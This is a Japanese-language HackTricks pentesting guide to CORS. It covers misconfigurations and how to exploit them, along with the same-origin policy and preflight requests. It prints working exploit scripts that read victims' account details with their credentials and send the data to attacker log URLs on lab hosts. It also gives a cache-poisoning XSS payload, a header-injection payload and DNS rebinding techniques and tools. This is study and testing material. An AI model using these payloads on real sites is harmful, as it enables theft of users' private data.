# CORS - 設定ミスとバイパス

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## CORSとは何ですか？

CORS（Cross-origin resource sharing）標準は、**サーバーがそのアセットにアクセスできる人を指定することを可能にし**、外部リソースからどの**HTTPリクエストメソッドが許可されているか**を指定するために必要です。

**同一生成元**ポリシーは、**リソースを要求するサーバー**と**リソースが位置するサーバー**が同じプロトコル([http://),ドメイン](http://\)ドメイン)名 (internal-web.com) および同じ**ポート**（80）を使用することを要求します。したがって、サーバーが同一生成元ポリシーを強制する場合、同じドメインとポートのWebページのみがリソースにアクセスできるようになります。

以下の表は、`http://normal-website.com/example/example.html`で同一生成元ポリシーがどのように適用されるかを示しています：

| アクセスされたURL                              | アクセス許可？                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | はい: 同じスキーム、ドメイン、ポート |
| `http://normal-website.com/example2/`     | はい: 同じスキーム、ドメイン、ポート |
| `https://normal-website.com/example/`     | いいえ: スキームとポートが異なる      |
| `http://en.normal-website.com/example/`   | いいえ: ドメインが異なる               |
| `http://www.normal-website.com/example/`  | いいえ: ドメインが異なる               |
| `http://normal-website.com:8080/example/` | いいえ: ポートが異なる\*               |

\*_Internet Explorerはポート番号を同一生成元ポリシーの適用時に考慮しないため、このアクセスを許可します。

### `Access-Control-Allow-Origin` ヘッダー

`Access-Control-Allow-Origin`の指定により、**複数の生成元**、または値**`null`**、またはワイルドカード**`*`**が可能です。しかし、**ブラウザは複数の生成元をサポートしていません**、そしてワイルドカード`*`の使用には**制限**があります。（_ワイルドカードは単独でのみ使用できます。これは失敗します `Access-Control-Allow-Origin: https://*.normal-website.com` そしてそれは_ _Access-Control-Allow-Credentials: true_ と一緒に使用することはできません）

このヘッダーは、ブラウザによって`Origin`ヘッダーが追加されたクロスドメインリソースをWebサイトが要求したときに**サーバーによって返されます**。

### `Access-Control-Allow-Credentials` ヘッダー

クロスオリジンリソースリクエストの**デフォルト**の動作は、クッキーやAuthorizationヘッダーのような**資格情報なしで**リクエストを**通過させる**ことです。しかし、クロスドメインサーバーは、CORSの**`Access-Control-Allow-Credentials`**ヘッダーを**`true`**に設定することで、資格情報がそれに**渡されたときに**レスポンスの**読み取りを許可**することができます。

値が`true`に設定されている場合、ブラウザは資格情報（クッキー、認証ヘッダー、またはTLSクライアント証明書）を送信します。
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### プリフライトリクエスト

特定の状況下で、クロスドメインリクエストが以下を含む場合：

* **標準外のHTTPメソッド（HEAD, GET, POST以外）**
* 新しい**ヘッダー**
* 特別な**Content-Typeヘッダー値**

{% hint style="info" %}
**プリフライトリクエストの送信を避けるリクエストの条件は**[**このリンク**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **で確認してください**
{% endhint %}

クロスオリジンリクエストの前に、**`OPTIONS`** **メソッド**を使用する**リクエスト**が行われ、CORSプロトコルにより、クロスオリジンリクエストを許可する前に、どの**メソッドとヘッダーが許可されているかの初期チェック**が必要です。これを**プリフライトチェック**と呼びます。サーバーは**許可されたメソッドのリスト**を返し、加えて**信頼されたオリジン**を返し、ブラウザはリクエストしているウェブサイトのメソッドが許可されているかをチェックします。

{% hint style="danger" %}
**プリフライトリクエストが送信されない場合でも**、"通常のリクエスト"の条件が尊重されている場合、**レスポンスには認証ヘッダーが必要です**。さもなければ、**ブラウザ**はリクエストの**レスポンスを読むことができません**。
{% endhint %}

**例えば**、これは`Special-Request-Header`という**カスタム**リクエスト**ヘッダー**を使用し、**`PUT`メソッド**の使用を求めるプリフライトリクエストです：
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
サーバーからは以下のようなレスポンスが返される可能性があります：
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` 許可されたヘッダー
* `Access-Control-Expose-Headers`
* `Access-Control-Max-Age` プリフライトレスポンスのキャッシュ可能な最大時間枠を定義
* `Access-Control-Request-Headers` クロスオリジンリクエストが送信したいヘッダー
* `Access-Control-Request-Method` クロスオリジンリクエストが使用したいメソッド
* `Origin` クロスオリジンリクエストの起源（ブラウザによって自動的に設定される）

![](../.gitbook/assets/preflight.svg)

通常（コンテンツタイプと設定されたヘッダーによって異なるが）、**GET/POSTリクエストではプリフライトリクエストは送信されない**（リクエストは**直接**送信される）。しかし、**レスポンスのヘッダー/ボディにアクセス**したい場合、それを許可する_Access-Control-Allow-Origin_ヘッダーが含まれている必要がある。\
**したがって、CORSはCSRFに対する保護ではないが（役立つことはある）。**

### **ローカルネットワークリクエスト プリフライトリクエスト**

ローカルネットワークIPアドレスにリクエストが送信される場合、2つの追加のCORSヘッダーが送信される：

* `Access-Control-Request-Local-Network` クライアントリクエストヘッダーは、リクエストがローカルネットワークリクエストであることを示す
* `Access-Control-Allow-Local-Network` サーバーレスポンスヘッダーは、リソースが外部ネットワークと安全に共有できることを示す

**ローカルネットワークリクエストを許可する有効なレスポンス**には、レスポンスにヘッダー`Access-Controls-Allow-Local_network: true`も含まれている必要がある：
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
注意: Linuxの**0.0.0.0** IPは、そのIPアドレスが「ローカル」と見なされないため、localhostへのアクセス要件を**バイパス**するために機能します。

また、ローカルエンドポイントの**公開IPアドレス**（ルーターの公開IPなど）を使用すると、**ローカルネットワークの要件をバイパス**することも可能です。いくつかの場合には、**公開IP**がアクセスされていても、それが**ローカルネットワークから**であれば、アクセスが許可されます。

{% endhint %}

## 悪用可能な誤設定

ほとんどの**実際の攻撃には`Access-Control-Allow-Credentials`**が**`true`**に設定されている必要があることに注意してください。これにより、ブラウザは資格情報を送信し、レスポンスを読むことができます。資格情報がなければ、多くの攻撃は関係なくなります。つまり、ユーザーのクッキーを利用することができないため、ブラウザからリクエストを発行することによって得られるものはほとんどありません。

注目すべき例外は、**被害者のネットワーク位置が一種の認証として機能する場合**です。被害者のブラウザをプロキシとして使用し、IPベースの認証をバイパスしてイントラネットアプリケーションにアクセスすることができます。影響の点ではDNSリバインディングに似ていますが、悪用するのははるかに簡単です。

### `Access-Control-Allow-Origin`における反映された`Origin`

実際の世界では、**これら2つのヘッダー値が一緒に禁止されている**ため、このようなことは起こり得ません。\
また、多くの開発者がCORSで**複数のURLを許可**したいと考えていますが、サブドメインのワイルドカードやURLのリストは許可されていません。そのため、いくつかの開発者は**`Access-Control-Allow-Origin`**ヘッダーを**動的に生成**し、多くの場合、単に**Originヘッダーの値をコピー**します。

その場合、**同じ脆弱性が悪用される可能性があります。**

他の場合、開発者は**ドメイン**(_victimdomain.com_)が**Originヘッダーに表示される**ことを確認するかもしれません。その場合、攻撃者は**`attackervictimdomain.com`**というドメインを使用して機密情報を盗むことができます。
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null`オリジン

`null`は**Origin**ヘッダーの特別な値です。仕様では、リダイレクトやローカルHTMLファイルによってトリガーされると記載されています。一部のアプリケーションは、アプリケーションのローカル開発をサポートするために`null`オリジンをホワイトリストに登録することがあります。\
これは、**複数のアプリケーションがこの値をCORS内で許可する**ため、**任意のウェブサイトがサンドボックス化されたiframeを使用してnullオリジンを簡単に取得できる**点で便利です：
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **Regexpバイパス**

ドメイン _victim.com_ が**ホワイトリスト**に登録されていることがわかった場合、_victim.com.**attacker.com**_ も**ホワイトリスト**に登録されているかどうかを確認するか、または**サブドメインを乗っ取ることができる**場合は、_**somesubdomain**.victim.com_ がホワイトリストに登録されているかを確認してください。

### **高度なRegexpバイパス**

文字列内のドメインを識別するために使用されるほとんどの正規表現は、英数字のASCII文字と `.-` に焦点を当てます。そのため、Originヘッダー内の `victimdomain.com{.attacker.com` は正規表現によって `victimdomain.com` として解釈されますが、ブラウザ（この場合、Safariはドメイン内のこの文字をサポートしています）は `attacker.com` のドメインにアクセスします。

`_` 文字（サブドメイン内）はSafariだけでなく、ChromeやFirefoxでもサポートされています！

**したがって、これらのサブドメインのいずれかを使用して、URLのメインドメインを見つけるための「一般的な」正規表現をバイパスすることができます。**

**このバイパスの詳細情報と設定については、以下を確認してください：** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **および** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### サブドメイン内のXSSから

CORSの悪用に対する開発者の防御メカニズムの一つは、情報へのアクセスを頻繁に要求するドメインをホワイトリストに登録することです。しかし、これは完全に安全ではありません。なぜなら、**ホワイトリスト**に登録されたドメインの**一つ**のサブドメインが**XSS**などの他の脆弱性に**影響を受けやすい**場合、CORSの悪用を可能にするからです。

例を考えてみましょう。次のコードは、_requester.com_ のサブドメインが _provider.com_ のリソースにアクセスできるようにする設定を示しています。
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
ユーザーがsub.requester.comにアクセスできるがrequester.comにはアクセスできないと仮定し、`sub.requester.com`がXSSに弱いとします。ユーザーはクロスサイトスクリプティング攻撃方法を使用して`provider.com`を悪用することができます。

### **サーバーサイドキャッシュポイズニング**

運が良ければ、HTTPヘッダーインジェクションを介してサーバーサイドキャッシュポイズニングを使用して、[stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)の脆弱性を作り出すことができるかもしれません。

アプリケーションが不正な文字をチェックせずに**Originヘッダー**を**反映**する場合、Internet ExplorerとEdgeが\r (0x0d)を有効なHTTPヘッダー終端と見なすため、**IE/Edgeユーザーに対するHTTPヘッダーインジェクションの脆弱性が発生します**：`GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorerは以下のように応答を見ます：

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

これは直接悪用できるものではありません。なぜなら攻撃者がウェブブラウザにこのような不正なヘッダーを送信させる方法はないからです。しかし、**Burp Suiteでこのリクエストを手動で作成し、サーバーサイドキャッシュが応答を保存して他の人に提供する可能性があります**。私が使用したペイロードはページの文字セットを**UTF-7**に変更します。これはXSSの脆弱性を作り出すのに特に有用です。

### **クライアントサイドキャッシュポイズニング**

カスタムHTTPヘッダーに[reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)があるページに時々遭遇したことがあるかもしれません。例えば、ウェブページがエンコーディングせずにカスタムヘッダーの内容を反映しているとします：
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
CORSを使用すると、ヘッダーに任意の値を送信できます。それ自体は**役に立たない**ですが、**注入されたJavaScriptがレンダリングされない**からです。しかし、**Vary: Originが指定されていない場合**、レスポンスは**ブラウザのキャッシュに保存され、関連するURLにブラウザがナビゲートすると直接表示される可能性があります**。私は[任意のURLでこの攻撃を試みるためのフィドル](https://jsfiddle.net/3gk8u8wu/3/)を作成しました。この攻撃はクライアントサイドのキャッシングを使用しているため、実際にはかなり信頼性があります。
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## Bypass

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSIは、`script`タグを使用してリソースが含まれる場合、SOPが適用されないという事実を悪用する種類の脆弱性を指します。なぜなら、スクリプトはクロスドメインで含まれることができる必要があるからです。攻撃者は、`script`タグを使用して含まれたすべてのものを読むことができます。

これは、クッキーのようないわゆる環境権限情報が認証に使用される場合、動的JavaScriptやJSONPに関して特に興味深いです。異なるホストからリソースを要求するとき、クッキーが含まれます。BurpSuiteプラグイン: [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**XSSIの異なるタイプとそれらをどのように悪用するかについてもっと読む。**](xssi-cross-site-script-inclusion.md)

リクエストに**`callback`** **パラメータ**を追加してみてください。ページがJSONPとしてデータを送信するように準備されているかもしれません。その場合、ページは`Content-Type: application/javascript`でデータを送り返し、CORSポリシーをバイパスします。

![](<../.gitbook/assets/image (229).png>)

### Easy (useless?) bypass

Webアプリケーションに代わりにリクエストを行い、レスポンスを送り返してもらうことができます。これにより、**`Access-Control-Allow-Origin`**はバイパスされますが、**最終的な被害者への資格情報は送信されない**ことに注意してください。なぜなら、あなたは**異なるドメイン**（リクエストを代わりに行うドメイン）に**連絡を取る**からです。

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escapeは、**プロキシ**を提供し、**リクエスト**とその**ヘッダー**を**渡し**、**Origin**ヘッダー（Origin = **要求されたドメイン**）を**偽装**します。したがって、**CORSポリシーはバイパスされます**。\
ソースコードは[Githubにあります](https://github.com/shalvah/cors-escape)ので、**自分自身のものをホスト**することができます。
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

プロキシは、送信したリクエストをそのまま「渡す」ようなものです。これを別の方法で解決することができますが、今回は他の誰かにリクエストを代わりに行ってもらいますが、**サーバーはあなたのリクエストをそのまま使うのではなく、あなたが指定したパラメーターで自身のリクエストを作成します。**

### Iframe + Popup Bypass

`e.origin === window.origin`のような**CORSチェックをバイパス**するには、**iframeを作成し**、**そこから新しいウィンドウを開く**ことができます。以下のページで詳細をご覧ください：

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

基本的には、**被害者にあなたのページにアクセスさせ**、その後で**ドメインのDNS（IP）を変更し**、**被害者のウェブページを指す**ようにします。**TTLが終了する**ときに何か（**JS**）を**実行させ**、新しいDNSリクエストが行われるため、情報を収集できます（**ユーザーをあなたのドメインに維持する**ため、彼は**被害者サーバーにクッキーを送信しません**。このオプションは**被害者のIPの特別な権限を悪用します**）。

**TTLを非常に低く設定しても**（0または1）、**ブラウザにはキャッシュがあり**、数秒から数分間、この悪用を**防ぐ**ことができます。

したがって、この技術は、被害者が**明示的にDNSリクエストを行ってIPをチェックする**場合（ボットが呼び出されたときに自分で行う）や、**ユーザー/ボットが長時間同じページにいる**ことができる場合（キャッシュの有効期限が切れるまで**待つ**ことができる）に有用です。

この悪用をすばやく行う必要がある場合は、[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)のようなサービスを使用できます。

自分のDNSリバインディングサーバーを実行したい場合は、[**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)などを使用し、**ローカルポート53/udpを公開し**、それに向けて**Aレコードを作成**（ns.example.com）、そして**以前に作成したAサブドメイン**（ns.example.com）を指す**NSレコードを作成**します。\
その後、そのサブドメイン（ns.example.com）の任意のサブドメインは、あなたのホストによって解決されます。

また、[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)で**公開されているサーバー**もチェックしてください。

### DNS Rebinding via **DNS Cache Flooding**

前のセクションで説明したように、**ブラウザ**はTTLで指定された時間よりも長くドメインのIPを**キャッシュ**します。しかし、この防御をバイパスする方法があります。

サービスワーカーを使用して**DNSキャッシュをフラッドし、2回目のDNSリクエストを強制する**ことができます。したがって、流れは以下のようになります：

1. 攻撃者のアドレスで応答されたDNSリクエスト
2. サービスワーカーがDNSキャッシュをフラッド（キャッシュされた攻撃者サーバー名が削除される）
3. 2回目のDNSリクエストは今回は127.0.0.1で応答される

![](<../.gitbook/assets/image (375) (1).png>)

_青色は最初のDNSリクエストで、オレンジ色はフラッドです。_

### DNS Rebinding via **Cache**

前のセクションで説明したように、**ブラウザ**はTTLで指定された時間よりも長くドメインのIPを**キャッシュ**します。しかし、別の方法でこの防御をバイパスすることができます。

**DNSプロバイダー**で**同じサブドメイン**に対して**2つのAレコードを作成する**（またはプロバイダーによっては**1つに2つのIP**）と、ブラウザがそれらをチェックするときに両方を取得します。

もし**ブラウザ**が最初に**攻撃者のIPアドレスを使用する**ことを決定した場合、**攻撃者**は**ペイロードを提供**し、同じ**ドメイン**への**HTTPリクエストを実行する**ことができます。しかし、攻撃者が被害者のIPを知ったら、**被害者ブラウザへの応答を停止します**。

ブラウザが**ドメインが応答していない**ことを発見すると、**2番目に与えられたIPを使用する**ため、**SOPをバイパスして異なる場所にアクセスします**。攻撃者はそれを悪用して**情報を取得し、持ち出す**ことができます。

{% hint style="warning" %}
localhostにアクセスするためには、Windowsでは**127.0.0.1**を、Linuxでは**0.0.0.0**をリバインドしようとする必要があります。\
godaddyやcloudflareなどのプロバイダーは0.0.0.0のIPを使用することを許可してくれませんでしたが、AWS route53は"0.0.0.0"を含む2つのIPを持つ1つのAレコードを作成することを許可してくれました。

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

詳細については、[https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)をご覧ください。

### その他の一般的なバイパス

* **内部IPが許可されていない**場合、0.0.0.0を**禁止するのを忘れている**可能性があります（LinuxとMacで機能します）
* **内部IPが許可されていない**場合、localhostへの**CNAME**で応答します（LinuxとMacで機能します）
* **内部IPがDNSレスポンスとして許可されていない**場合、www.corporate.internalなどの**内部サービスへのCNAMEで応答**できます。

### DNS Rebidding Weaponized

前述のバイパス技術と、以下のツールの使用方法についての詳細は、[Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ)のトークで確認できます。

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)は、[DNSリバインディング](https://en.wikipedia.org/wiki/DNS_rebinding)攻撃を実行するためのツールです。攻撃サーバーのDNS名のIPアドレスをターゲットマシンのIPアドレスにリバインドし、ターゲットマシン上の脆弱なソフトウェアを悪用するための攻撃ペイロードを提供するための必要なコンポーネントが含まれています。

### DNS Rebindingに対する実際の保護

* 内部サービスでTLSを使用する
* データへのアクセスに認証を要求する
* Hostヘッダーを検証する
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): 公開サーバーが内部サーバーにアクセスしたい場合は、常にプリフライトリクエストを送信する提案

## **ツール**

**CORSポリシーの誤設定をファジングする**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## 参考文献

{% embed url="https://portswigger.net/web-security/cors" %}

{% embed url="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS" %}

{% embed url="https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties" %}

{% embed url="https://www.codecademy.com/articles/what-is-cors" %}

{% embed url="https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors" %}

{% embed url="https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration" %}

{% embed url="https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b" %}

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、Twitter 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
